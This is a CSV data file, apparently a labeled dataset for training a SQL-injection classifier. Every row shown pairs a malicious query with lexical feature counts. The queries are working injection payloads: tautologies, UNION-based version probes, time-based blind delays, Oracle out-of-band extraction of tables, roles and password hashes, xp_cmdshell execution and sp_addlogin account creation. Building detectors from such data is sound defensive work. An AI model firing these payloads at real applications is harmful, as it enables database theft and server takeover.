,Query,Label,query_len,num_words_query,no_single_qts,no_double_qts,no_punct,no_single_cmnt,no_mult_cmnt,no_space,no_perc,no_log_opt,no_arith,no_null,no_hexa,no_alpha,no_digit,len_of_chr_char_null,genuine_keywords
207,""" or """"^""",1,9,3,0,4,5,0,0,2,0,1,0,0,0,2,0,0,0
208,"""-""",1,3,1,0,2,3,0,0,0,0,0,1,0,0,0,0,0,0
209," select * from users where id  =  1 or \<   =  1 union select 1,@@version -- 1",1,78,17,0,0,9,1,0,17,0,1,3,0,0,42,4,0,2
210," select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",1,76,15,0,0,10,1,0,15,0,0,3,0,0,40,3,0,2
211," select * from users where id  =  1 *\ union select null,@@version -- 1",1,71,14,0,0,8,1,0,14,0,0,4,1,0,44,2,1,2
212," select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'",1,83,17,3,0,13,1,0,17,0,2,3,0,0,42,3,0,2
213," select * from users where id  =  1 or "".%"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,1,2,3,0,0,26,4,0,1
214,admin'/*,1,8,1,1,0,3,0,1,0,0,0,0,0,0,5,0,0,0
215," select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1",1,63,18,0,2,9,1,0,18,0,2,3,0,0,26,4,0,1
216,||utl_http.request,1,18,1,0,0,4,0,0,0,0,1,0,0,0,14,0,0,0
217," and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  table_name  )   from   (  select distinct  (  table_name  )  , rownum as limit from sys.all_tables  )   where limit  =  1   )    )    and 'i'  =  'i",1,218,35,3,0,25,0,0,35,0,2,0,0,0,120,2,0,2
218," select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",1,80,15,3,0,14,1,0,15,0,0,3,0,0,40,3,0,2
219,"""   )    )    or benchmark  (  10000000,md5  (  1   )    )   #",1,62,12,0,1,9,0,0,11,0,1,0,0,0,13,10,0,0
220," select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1",1,78,16,0,0,11,1,0,16,0,0,3,0,0,40,3,0,2
221," select * from users where id  =  1 or $ .  =  1 union select 1,@@version -- 1",1,78,18,0,0,10,1,0,18,0,1,3,0,0,42,4,0,2
222,select * from users where id  =  '1' <@.$ or 1  =  1 -- 1',1,58,15,3,0,12,1,0,14,0,1,3,0,0,24,4,0,1
223,1 uni/**/on select all from where,1,33,6,0,0,4,0,1,5,0,0,2,0,0,23,1,0,1
224," select * from users where id  =  1 +$ . union select null,@@version -- 1",1,73,15,0,0,10,1,0,15,0,0,4,1,0,44,2,1,2
225," select * from users where id  =  1 or 1#""? union select null,version  (    )   -- 1",1,84,17,0,1,10,1,0,17,0,1,3,1,0,46,3,1,2
226,admin'  )   or '1'  =  '1'#,1,27,6,5,0,8,0,0,5,0,1,0,0,0,7,2,0,0
227,||utl_http.request  (  'http://192.168.1.1/'  )  ||',1,52,5,3,0,18,0,0,4,0,2,2,0,0,18,8,0,0
228,or '7659'  =  '7659,1,19,4,3,0,4,0,0,3,0,0,0,0,0,2,8,0,0
229," select * from users where id  =  1 or ""{@"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
230," select * from users where id  =  1 union select +!<1,version  (    )   -- 1",1,76,15,0,0,10,1,0,15,0,1,4,0,0,40,3,0,2
231," and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  granted_role  )   from   (  select distinct  (  granted_role  )  , rownum as limit from dba_role_privs where grantee  =  sys.loginuser  )   where limit  =  6   )    )    and 'i'  =  'i",1,254,39,3,0,27,0,0,39,0,2,0,0,0,148,2,0,2
232," select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",1,63,18,0,2,9,1,0,18,0,2,3,0,0,26,4,0,1
233,or true--,1,9,2,0,0,2,1,0,1,0,0,2,0,0,6,0,0,0
234," select * from users where id  =  1 union select !<1,version  (    )   -- 1",1,75,15,0,0,9,1,0,15,0,1,3,0,0,40,3,0,2
235," select * from users where id  =  '1' union select \#,@@version -- 1'",1,69,13,3,0,11,1,0,13,0,0,3,0,0,40,2,0,2
236," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",1,81,17,0,1,10,1,0,17,0,1,3,0,0,42,4,0,2
237,""" or true--",1,11,3,0,1,3,1,0,2,0,1,2,0,0,6,0,0,0
238,select * from users where id  =  1. or 1  =  1 -- 1,1,51,14,0,0,6,1,0,13,0,1,3,0,0,24,4,0,1
239," select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1",1,87,19,0,1,12,1,0,19,0,1,3,0,0,42,4,0,2
240," select * from users where id  =  1 or "";@"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
241,â or 3  =  3 --,1,17,6,0,0,3,1,0,5,0,1,2,0,0,2,2,0,0
242, and 1  =  utl_inaddr.get_host_address   (    (   select global_name from global_name   )    )    and 'i'  =  'i,1,112,16,3,0,15,0,0,16,0,2,0,0,0,61,1,0,1
243," select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",1,102,20,0,0,8,1,0,20,0,0,4,1,0,66,4,1,2
244," select * from users where id  =  1 or "",,""  =  1 or 1  =  1 -- 1",1,65,18,0,2,10,1,0,18,0,2,3,0,0,26,5,0,1
245," select * from users where id  =  1 + $+%1 union select null,@@version -- 1",1,75,15,0,0,11,1,0,15,1,0,5,1,0,44,3,1,2
246," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",1,97,20,0,1,12,1,0,20,0,1,3,0,0,49,3,0,2
247," select * from users where id  =  1 or ""  )  1"" or 1  =  1 -- 1",1,63,18,0,2,8,1,0,18,0,2,3,0,0,26,5,0,1
248, or uid like '%,1,15,4,1,0,2,0,0,4,1,1,0,0,0,9,0,0,0
249,select * from users where id  =  '1' <@&1 or 1  =  1 -- 1',1,58,15,3,0,11,1,0,14,0,1,3,0,0,24,5,0,1
250," select * from users where id  =  '1' union select !<1,version  (    )   -- 1'",1,78,15,3,0,12,1,0,15,0,1,3,0,0,40,3,0,2
251,23 or 1  =  1; --,1,17,6,0,0,4,1,0,5,0,1,2,0,0,2,4,0,0
252," select * from users where id  =  1 or \<\. union select 1,@@version -- 1",1,73,15,0,0,9,1,0,15,0,1,3,0,0,42,3,0,2
253," select * from users where id  =  1 or ""{  (  ""  =  1 or 1  =  1 -- 1",1,69,20,0,2,10,1,0,20,0,2,3,0,0,26,5,0,1
254," select * from users where id  =  1 or ""%_"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,1,2,3,0,0,26,4,0,1
255,select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,1,65,18,0,0,9,1,0,17,0,1,4,0,0,24,4,0,1
256," select * from users where id  =  '1' union select \,@@version -- 1'",1,68,13,3,0,10,1,0,13,0,0,3,0,0,40,2,0,2
257,0 or 1  =  1,1,12,5,0,0,1,0,0,4,0,1,0,0,0,2,3,0,0
258,select * from users where id  =  1 &@ or 1  =  1 -- 1,1,53,15,0,0,7,1,0,14,0,1,3,0,0,24,4,0,1
259,"admin""  )   or ""1""  =  ""1",1,25,6,0,4,6,0,0,5,0,1,0,0,0,7,2,0,0
260,select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,1,63,18,0,0,7,1,0,17,0,2,3,0,0,26,5,0,1
261," select * from users where id  =  1 or ""??"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
262," and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  password  )   from   (  select distinct  (  password  )  , rownum as limit from sys.user$  )   where limit  =  5   )    )    and 'i'  =  'i",1,209,35,3,0,23,0,0,35,0,2,0,0,0,113,2,0,2
263," and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  column_name  )   from   (  select distinct  (  column_name  )  , rownum as limit from all_tab_columns  )   where limit  =  7   )    )    and 'i'  =  'i",1,221,35,3,0,25,0,0,35,0,2,0,0,0,123,2,0,2
264,&apos; or,1,9,2,0,0,2,0,0,1,0,0,0,0,0,6,0,0,0
265,sqlvuln;,1,8,1,0,0,1,0,0,0,0,0,0,0,0,7,0,0,0
266,select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,1,57,16,0,0,10,1,0,15,1,1,5,0,0,24,4,0,1
267,select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1',1,60,16,3,0,12,1,0,15,1,1,5,0,0,24,4,0,1
268,""" or """"*""",1,9,3,0,4,5,0,0,2,0,1,1,0,0,2,0,0,0
269,"hi or 1  =  1 --""",1,17,6,0,1,4,1,0,5,0,1,2,0,0,4,2,0,0
270," select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1",1,100,19,0,0,8,1,0,19,0,0,3,1,0,66,3,1,2
271,; exec master..xp_cmdshell 'ping 172.10.1.255'--,1,48,5,2,0,11,1,0,4,0,0,2,0,0,24,9,0,0
272," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,111,23,3,0,12,1,0,23,0,1,3,0,0,64,6,0,2
273," select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'",1,79,15,3,2,14,1,0,15,0,0,3,0,0,40,2,0,2
274,select * from information_schema.tables--,1,41,4,0,0,5,1,0,3,0,0,3,0,0,33,0,0,1
275,select * from users where id  =  1 or \<\. or 1  =  1 -- 1,1,58,16,0,0,7,1,0,15,0,2,3,0,0,26,4,0,1
276,   (  select top 1,1,18,4,0,0,1,0,0,4,0,0,0,0,0,9,1,0,2
277,ã½ or 1  =  1 --,1,16,6,0,0,3,1,0,5,0,1,2,0,0,2,2,0,0
278,a' --,1,5,2,1,0,3,1,0,1,0,0,2,0,0,1,0,0,0
279, or 1  =  1 /*,1,14,5,0,0,3,0,1,5,0,1,0,0,0,2,2,0,0
280," select * from users where id  =  1 or 1#"", union select null,version  (    )   -- 1",1,84,17,0,1,10,1,0,17,0,1,3,1,0,46,3,1,2
281," select * from users where id  =  '1' union select $ .,@@version -- 1'",1,70,14,3,0,12,1,0,14,0,0,3,0,0,40,2,0,2
282,--,1,2,1,0,0,2,1,0,0,0,0,2,0,0,0,0,0,0
283,"exec sp_addlogin 'name' , 'password'",1,36,5,4,0,6,0,0,4,0,0,0,0,0,26,0,0,0
284," select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1",1,101,19,0,0,7,1,0,19,0,0,3,1,0,66,3,1,2
285,0x77616974666f722064656c61792027303a303a31302700 exec  (  @s  ) ,1,64,5,0,0,3,0,0,5,0,0,0,0,1,10,43,0,0
286," select * from users where id  =  1 or "".  )  "" or 1  =  1 -- 1",1,63,18,0,2,9,1,0,18,0,2,3,0,0,26,4,0,1
287," select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1",1,86,19,0,0,11,1,0,19,0,1,3,0,0,42,4,0,2
288,group by userid having 1  =  1--,1,32,7,0,0,3,1,0,6,0,0,2,0,0,19,2,0,0
289," select * from users where id  =  1 + \+%1 union select null,@@version -- 1",1,75,15,0,0,10,1,0,15,1,0,5,1,0,44,3,1,2
290,select * from users where id  =  1 *1 or 1  =  1 -- 1,1,53,15,0,0,6,1,0,14,0,1,4,0,0,24,5,0,1
291," select * from users where id  =  1 or @#"";  =  1 or 1  =  1 -- 1",1,65,18,0,1,10,1,0,18,0,2,3,0,0,26,5,0,1
292,‘ or 1  =  1 --,1,15,6,0,0,3,1,0,5,0,1,2,0,0,2,2,0,0
293," select * from users where id  =  1 *\. union select null,@@version -- 1",1,72,14,0,0,9,1,0,14,0,0,4,1,0,44,2,1,2
294,select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,1,63,18,0,0,9,1,0,17,1,1,3,0,0,24,4,0,1
295,or 'a'  =  'a,1,13,4,3,0,4,0,0,3,0,0,0,0,0,4,0,0,0
296,declare @s varchar  (  22  )   select @s   = ,1,45,9,0,0,5,0,0,9,0,0,0,0,0,22,2,1,1
297," select * from users where id  =  1 union select 1<@,version  (    )   -- 1",1,75,15,0,0,9,1,0,15,0,0,3,0,0,40,3,0,2
298," select * from users where id  =  1 + \+*\ union select null,@@version -- 1",1,75,15,0,0,10,1,0,15,0,0,5,1,0,44,2,1,2
299," select * from users where id  =  1 or 1#"". union select version  (    )  ,version  (    )   -- 1",1,97,20,0,1,12,1,0,20,0,1,3,0,0,49,3,0,2
300,@variable,1,9,1,0,0,1,0,0,0,0,0,0,0,0,8,0,0,0
301,; exec master..xp_cmdshell,1,26,3,0,0,4,0,0,2,0,0,0,0,0,20,0,0,0
302,select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,1,63,18,0,0,8,1,0,17,0,1,4,0,0,24,5,0,1
303," select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",1,76,16,0,0,9,1,0,16,0,0,3,0,0,40,3,0,2
304," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",1,76,16,0,0,8,1,0,16,0,0,3,0,0,41,3,0,2
305," select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1",1,87,19,0,0,11,1,0,19,0,1,3,0,0,42,4,0,2
306," select * from users where id  =  '1' or   (  \.  )    =  1 union select 1,@@version -- 1'",1,90,19,3,0,14,1,0,19,0,1,3,0,0,42,4,0,2
307, and 1 in   (  select var from temp  )  --,1,42,10,0,0,4,1,0,10,0,1,2,0,0,22,1,0,1
308," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",1,102,19,3,2,13,1,0,19,0,1,3,0,0,62,4,0,2
309," select * from users where id  =  1 or ""1]"" or 1  =  1 -- 1",1,59,16,0,2,8,1,0,16,0,2,3,0,0,26,5,0,1
310," select * from users where id  =  1 or ""$?"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
311,or x  =  x,1,10,4,0,0,1,0,0,3,0,0,0,0,0,4,0,0,0
312,or a  =  a,1,10,4,0,0,1,0,0,3,0,0,0,0,0,4,0,0,0
313,or '1'  =  '1,1,13,4,3,0,4,0,0,3,0,0,0,0,0,2,2,0,0
314," select * from users where id  =  11<1# union select 1,version  (    )   -- 1",1,77,15,0,0,9,1,0,15,0,0,3,0,0,40,5,0,2
315,   )    )    or    (    (   'x'   )    )     =     (    (   'x,1,62,12,3,0,12,0,0,12,0,1,0,0,0,4,0,0,0
316," select * from users where id  =  '1' or \.<1 union select 1,@@version -- 1'",1,76,15,3,0,12,1,0,15,0,1,3,0,0,42,4,0,2
317," select * from users where id  =  '1' <@&1 union select 1,version  (    )   -- 1'",1,81,16,3,0,13,1,0,16,0,0,3,0,0,40,4,0,2
318," and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  table_name  )   from   (  select distinct  (  table_name  )  , rownum as limit from sys.all_tables  )   where limit  =  4   )    )    and 'i'  =  'i",1,218,35,3,0,25,0,0,35,0,2,0,0,0,120,2,0,2
319,; if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --,1,70,12,4,0,13,1,0,11,0,0,2,0,0,37,4,0,0
320,select * from users where id  =  1 <@<@ or 1  =  1 -- 1,1,55,15,0,0,9,1,0,14,0,1,3,0,0,24,4,0,1
321," select * from users where id  =  1 union select @<@$,version  (    )   -- 1",1,76,15,0,0,11,1,0,15,0,0,3,0,0,40,2,0,2
322," select * from users where id  =  '1' <@<@ union select 1,version  (    )   -- 1'",1,81,16,3,0,14,1,0,16,0,0,3,0,0,40,3,0,2
323," select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
324," select * from users where id  =  1 or 1#""{ union select version  (    )  ,version  (    )   -- 1",1,97,20,0,1,12,1,0,20,0,1,3,0,0,49,3,0,2
325,a' or 1  =  1--,1,15,5,1,0,4,1,0,4,0,1,2,0,0,3,2,0,0
326, )   or   (  a  =  a,1,20,6,0,0,3,0,0,6,0,1,0,0,0,4,0,0,0
327,"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",1,63,13,0,4,13,0,0,12,0,1,0,0,0,4,0,0,0
328," select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",1,59,16,0,1,8,1,0,16,0,2,3,0,0,26,5,0,1
329," select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",1,81,16,3,0,14,1,0,16,0,0,3,0,0,40,3,0,2
330,-- &password  = ,1,16,3,0,0,4,1,0,3,0,0,2,0,0,8,0,0,0
331,select * from users where id  =  1 <@. or 1  =  1 -- 1,1,54,15,0,0,8,1,0,14,0,1,3,0,0,24,4,0,1
332," select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",1,67,19,0,2,9,1,0,19,0,2,3,0,0,26,4,0,1
333," select * from users where id  =  1 %$ 1 union select null,@@version -- 1",1,73,15,0,0,9,1,0,15,1,0,3,1,0,44,3,1,2
334," and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  granted_role  )   from   (  select distinct  (  granted_role  )  , rownum as limit from dba_role_privs where grantee  =  sys.loginuser  )   where limit  =  3   )    )    and 'i'  =  'i",1,254,39,3,0,27,0,0,39,0,2,0,0,0,148,2,0,2
335, or '1'  =  '1,1,14,4,3,0,4,0,0,4,0,1,0,0,0,2,2,0,0
336,admin' or 1  =  1,1,17,5,1,0,2,0,0,4,0,1,0,0,0,7,2,0,0
337," select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1",1,65,18,0,2,10,1,0,18,0,2,3,0,0,26,5,0,1
338," select * from users where id  =  1 union select @||1,version  (    )   -- 1",1,76,15,0,0,10,1,0,15,0,1,3,0,0,40,3,0,2
339," select * from users where id  =  1 +\+. union select null,@@version -- 1",1,73,14,0,0,10,1,0,14,0,0,5,1,0,44,2,1,2
340," select * from users where id  =  1 or ""  )  ,"" or 1  =  1 -- 1",1,63,18,0,2,9,1,0,18,0,2,3,0,0,26,4,0,1
341," union select * from users where login   =   char  (  114,111,111,116  )  ;",1,75,13,0,0,8,0,0,13,0,0,1,0,0,34,12,1,1
342," select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",1,81,17,0,1,10,1,0,17,0,1,3,0,0,42,4,0,2
343, or 1  =  1--,1,13,4,0,0,3,1,0,4,0,1,2,0,0,2,2,0,0
344," and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  granted_role  )   from   (  select distinct  (  granted_role  )  , rownum as limit from dba_role_privs where grantee  =  sys.loginuser  )   where limit  =  5   )    )    and 'i'  =  'i",1,254,39,3,0,27,0,0,39,0,2,0,0,0,148,2,0,2
345,pg_sleep  (  __time__  )  --,1,28,5,0,0,9,1,0,4,0,0,2,0,0,11,0,0,0
346,‘ or 3  =  3 --,1,15,6,0,0,3,1,0,5,0,1,2,0,0,2,2,0,0
347," select * from users where id  =  1 -1<@ union select 1,version  (    )   -- 1",1,78,16,0,0,10,1,0,16,0,0,4,0,0,40,4,0,2
348," select * from users where id  =  1 or ""$#"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
349, )   union select * from information_schema.tables;,1,51,6,0,0,5,0,0,6,0,0,1,0,0,38,0,0,1
350," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",1,63,18,0,2,9,1,0,18,0,2,3,0,0,26,4,0,1
351,"  )   or benchmark  (  10000000,md5  (  1   )    )   #",1,54,10,0,0,7,0,0,10,0,1,0,0,0,13,10,0,0
352, and 1  =  utl_inaddr.get_host_address   (    (   select count  (  distinct  (  column_name   )    )    from sys.all_tab_columns   )    )    and 'i'  =  'i,1,155,22,3,0,21,0,0,22,0,2,0,0,0,80,1,0,2
353," and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  table_name  )   from   (  select distinct  (  table_name  )  , rownum as limit from sys.all_tables  )   where limit  =  7   )    )    and 'i'  =  'i",1,218,35,3,0,25,0,0,35,0,2,0,0,0,120,2,0,2
354,""" or """" """,1,9,4,0,4,4,0,0,3,0,1,0,0,0,2,0,0,0
355,delete,1,6,1,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0
356,;waitfor delay '0:0:__time__'--,1,31,3,2,0,11,1,0,2,0,0,2,0,0,16,2,0,0
357, or 1  =  1 --,1,15,6,0,0,3,1,0,5,0,1,2,0,0,2,2,0,0
358,1' and non_existant_table   =   '1,1,34,5,2,0,5,0,0,4,0,1,0,0,0,19,2,0,0
359," select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",1,63,18,0,2,9,1,0,18,0,2,3,0,0,26,4,0,1
360," select * from users where id  =  '1' + $ . union select 1,@@version -- 1'",1,74,16,3,0,13,1,0,16,0,0,4,0,0,40,3,0,2
361,declare @s varchar  (  200  )   select @s   =   0x77616974 ...,1,62,11,0,0,8,0,0,10,0,0,0,0,1,23,12,1,1
362,x' and userid is null; --,1,25,6,1,0,4,1,0,5,0,1,2,1,0,16,0,1,0
363," select * from users where id  =  1 or "";["" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
364," select * from users where id  =  '1' or \.<   =  1 union select 1,@@version -- 1'",1,82,17,3,0,13,1,0,17,0,1,3,0,0,42,4,0,2
365," select * from users where id  =  1 union select @<@,version  (    )   -- 1",1,75,15,0,0,10,1,0,15,0,0,3,0,0,40,2,0,2
366," select * from users where id  =  1 -@<@ union select 1,version  (    )   -- 1",1,78,16,0,0,11,1,0,16,0,0,4,0,0,40,3,0,2
367, and 1  =  utl_inaddr.get_host_address   (    (   select host_name from v$instance   )    )    and 'i'  =  'i,1,109,16,3,0,15,0,0,16,0,2,0,0,0,58,1,0,1
368," and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  column_name  )   from   (  select distinct  (  column_name  )  , rownum as limit from all_tab_columns  )   where limit  =  2   )    )    and 'i'  =  'i",1,221,35,3,0,25,0,0,35,0,2,0,0,0,123,2,0,2
369,select * from users where id  =  1 +   (  \+  )   or 1  =  1 -- 1,1,65,18,0,0,9,1,0,17,0,1,5,0,0,24,4,0,1
370," select * from users where id  =  1 or "".["" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
371," select * from users where id  =  1 or ""  (  ["" or 1  =  1 -- 1",1,63,18,0,2,9,1,0,18,0,2,3,0,0,26,4,0,1
372,union all select,1,16,3,0,0,0,0,0,2,0,0,0,0,0,14,0,0,1
373," select * from users where id  =  1 or ""1#"" or 1  =  1 -- 1",1,59,16,0,2,8,1,0,16,0,2,3,0,0,26,5,0,1
374,select * from users where id  =  1 or \<1 or 1  =  1 -- 1,1,57,16,0,0,6,1,0,15,0,2,3,0,0,26,5,0,1
375," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",1,101,21,0,0,9,1,0,21,0,0,3,0,0,62,5,0,2
376,x' or full_name like '%bob%,1,27,5,2,0,5,0,0,4,2,1,0,0,0,18,0,0,0
377,x' and members.email is null; --,1,32,6,1,0,5,1,0,5,0,1,2,1,0,22,0,1,0
378, or 2 > 1,1,9,4,0,0,1,0,0,4,0,1,0,0,0,2,2,0,0
379,select * from users where id  =  1.*1 or 1  =  1 -- 1,1,53,14,0,0,7,1,0,13,0,1,4,0,0,24,5,0,1
380,"""  )   or pg_sleep  (  __time__  )  --",1,38,8,0,1,11,1,0,7,0,1,2,0,0,13,0,0,0
381, ',1,2,1,1,0,1,0,0,1,0,0,0,0,0,0,0,0,0
382," select * from users where id  =  1 or $<\. union select 1,@@version -- 1",1,73,15,0,0,10,1,0,15,0,1,3,0,0,42,3,0,2
383," select * from users where id  =  1 or ""@  )  "" or 1  =  1 -- 1",1,63,18,0,2,9,1,0,18,0,2,3,0,0,26,4,0,1
384,select * from users where id  =  1 or \.<$ or 1  =  1 -- 1,1,58,16,0,0,8,1,0,15,0,2,3,0,0,26,4,0,1
385, )   or sleep  (  __time__  )    =  ',1,37,8,1,0,9,0,0,8,0,1,0,0,0,11,0,0,0
386,sleep 50',1,9,2,1,0,1,0,0,1,0,0,0,0,0,5,2,0,0
387," select * from users where id  =  '1' + 1||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,106,21,3,0,13,1,0,21,0,1,4,0,0,62,6,0,2
388,select * from users where id  =  1 + $+%\ or 1  =  1 -- 1,1,57,16,0,0,9,1,0,15,1,1,5,0,0,24,4,0,1
389," select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1",1,63,18,0,2,9,1,0,18,0,2,3,0,0,26,4,0,1
390,or sleep  (  __time__  )    =  ',1,32,7,1,0,8,0,0,6,0,0,0,0,0,11,0,0,0
391," select * from users where id  =  1 or "";_"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
392," select * from users where id  =  1 or 1#"". union select 1,version  (    )   -- 1",1,81,17,0,1,10,1,0,17,0,1,3,0,0,42,4,0,2
393," select * from users where id  =  1 union select  @ $,version  (    )   -- 1",1,76,16,0,0,9,1,0,16,0,0,3,0,0,40,2,0,2
394," select * from users where id  =  1 union select +!<@,version  (    )   -- 1",1,76,15,0,0,11,1,0,15,0,1,4,0,0,40,2,0,2
395," select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1",1,81,16,0,0,11,1,0,16,0,0,3,1,0,44,2,1,2
396,or 2 > 1,1,8,4,0,0,1,0,0,3,0,0,0,0,0,2,2,0,0
397,; exec   (  'sel' + 'ect us' + 'er'  ) ,1,39,10,6,0,11,0,0,10,0,0,2,0,0,14,0,0,0
398,anything' or 'x'  =  'x,1,23,5,4,0,5,0,0,4,0,1,0,0,0,12,0,0,0
399," select * from users where id  =  1 or \<\ union select 1,@@version -- 1",1,72,15,0,0,8,1,0,15,0,1,3,0,0,42,3,0,2
400," select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",1,106,22,0,0,9,1,0,22,0,0,3,0,0,62,4,0,2
401," select * from users where id  =  1 *  (  \  )   union select null,@@version -- 1",1,81,17,0,0,10,1,0,17,0,0,4,1,0,44,2,1,2
402,&',1,2,1,1,0,2,0,0,0,0,0,0,0,0,0,0,0,0
403,a' or 3  =  3--,1,15,5,1,0,4,1,0,4,0,1,2,0,0,3,2,0,0
404," select * from users where id  =  '1' or $+<$ union select 1,@@version -- 1'",1,76,15,3,0,14,1,0,15,0,1,4,0,0,42,3,0,2
405," select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",1,99,20,0,0,8,1,0,20,0,0,4,0,0,62,5,0,2
406,"admin""or 1  =  1 or """"  =  """,1,28,8,0,4,6,0,0,7,0,1,0,0,0,9,2,0,0
407,uni/**/on sel/**/ect,1,20,2,0,0,8,0,2,1,0,0,4,0,0,11,0,0,0
408,""" or """"&""",1,9,3,0,4,5,0,0,2,0,1,0,0,0,2,0,0,0
409, )    )   ;waitfor delay '0:0:__time__'--,1,41,5,2,0,13,1,0,5,0,0,2,0,0,16,2,0,0
410," select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
411,1 waitfor delay '0:0:10'--,1,26,4,2,0,6,1,0,3,0,0,2,0,0,12,5,0,0
412,bfilename,1,9,1,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0
413,admin'  )   or   (  '1'  =  '1'--,1,33,7,5,0,10,1,0,6,0,1,2,0,0,7,2,0,0
414,uef,1,3,1,0,0,0,0,0,0,0,0,0,0,0,3,0,0,0
415, -- &password  = ,1,17,3,0,0,4,1,0,4,0,0,2,0,0,8,0,0,0
416,1 or sleep  (  __time__  )  #,1,29,7,0,0,7,0,0,6,0,1,0,0,0,11,1,0,0
